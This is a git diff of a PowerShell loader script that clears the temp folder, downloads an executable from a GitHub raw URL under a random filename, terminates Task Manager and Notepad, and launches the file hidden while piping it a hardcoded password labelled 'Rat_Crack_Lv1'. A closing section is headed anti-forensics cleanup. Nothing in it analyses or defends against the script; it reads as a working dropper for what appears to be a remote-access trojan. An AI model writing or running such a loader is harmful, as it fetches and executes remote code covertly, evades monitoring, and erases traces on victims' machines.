@@ -14,20 +14,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
 }
 
-# === Add Win32 API for hiding windows (ShowWindow) ===
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Win32Window {
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-}
-"@
-
 # === 1. Clear Temp Folder ===
 Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
 $tempDir = $env:TEMP
@@ -43,8 +29,6 @@ catch {
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $exeFileName = "$randomGuid.exe"
 $exePath = Join-Path $env:TEMP $exeFileName
-
-# 👇 UPDATED: Download from the GitHub raw URL
 $exeUrl = "https://raw.githubusercontent.com/TSTEAM865/fafawfqf/main/cmd.exe"
 
 try {
@@ -80,22 +64,28 @@ foreach ($pName in @("taskmgr", "notepad")) {
 }
 Start-Sleep -Seconds 1
 
-# === 4. Launch the downloaded EXE ===
-Write-Host "[+] Launching the downloaded EXE..." -ForegroundColor Yellow
+# === 4. Launch the EXE and send password via stdin ===
+Write-Host "[+] Launching EXE and sending password..." -ForegroundColor Yellow
 
-$proc = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+$password = "Rat_Crack_Lv1"
 
-if (-not $proc) {
-    Write-Host "[!] Failed to start the EXE. Trying without hiding..." -ForegroundColor Yellow
-    $proc = Start-Process -FilePath $exePath -PassThru -ErrorAction SilentlyContinue
-}
+# Create process with redirected standard input
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $exePath
+$psi.UseShellExecute = $false          # Required for redirect
+$psi.RedirectStandardInput = $true     # We will write to stdin
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden   # Hide window (optional)
 
-if ($proc) {
-    Write-Host "[+] EXE launched (PID: $($proc.Id))." -ForegroundColor Green
-} else {
-    Write-Host "[!] Could not launch the EXE." -ForegroundColor Red
-    exit 1
-}
+$proc = [System.Diagnostics.Process]::Start($psi)
+
+# Wait a moment for the EXE to be ready (adjust if needed)
+Start-Sleep -Milliseconds 500
+
+# Write the password and then a newline (Enter)
+$proc.StandardInput.WriteLine($password)
+$proc.StandardInput.Close()   # Close stdin – some programs need this
+
+Write-Host "[+] Password sent." -ForegroundColor Green
 
 # === 5. Enhanced Cleanup & Anti-Forensics ===
 Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan
